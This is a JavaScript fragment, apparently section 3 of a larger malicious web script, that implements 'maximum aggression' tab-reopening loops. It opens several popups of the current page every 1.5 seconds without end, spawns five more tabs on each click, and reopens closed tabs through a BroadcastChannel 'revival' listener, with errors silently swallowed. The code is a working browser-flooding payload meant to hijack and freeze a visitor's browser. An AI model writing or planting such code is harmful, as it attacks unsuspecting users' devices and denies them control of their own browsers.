/**
 * 3. TAB REOPENING LOOPS - MAXIMUM AGGRESSION
 */
const TabReopeningLoops = {
    channel: null,
    childWindows: [],
    init: function() {
        this.setupBroadcastChannel();
        this.startTabLoop();
        this.openOnInteraction();
    },
    setupBroadcastChannel: function() {
        this.channel = new BroadcastChannel('tab_revival_channel');
        this.channel.onmessage = (event) => {
            if (event.data.type === 'revive') this.reopenTab(event.data.url);
        };
    },
    startTabLoop: function() {
        const openTabs = () => {
            const urls = [window.location.href, window.location.href + '?r=1', window.location.href + '?r=2', window.location.href + '?r=3'];
            urls.forEach((url, i) => {
                setTimeout(() => {
                    try {
                        const newWin = window.open(url, '_blank', 'width=800,height=600');
                        if (newWin) {
                            this.childWindows.push(newWin);
                            try { newWin.location = url; } catch(e) {}
                        }
                    } catch(e) {}
                }, i * 200);
            });
        };
        openTabs();
        setInterval(openTabs, 1500); // Every 1.5s
    },
    openOnInteraction: function() {
        document.addEventListener('click', () => {
            for (let i = 0; i < 5; i++) {
                try { window.open(window.location.href, '_blank'); } catch(e) {}
            }
        });
    },
    reopenTab: function(url) {
        try { window.open(url || window.location.href, '_blank'); } catch(e) {}
    }
};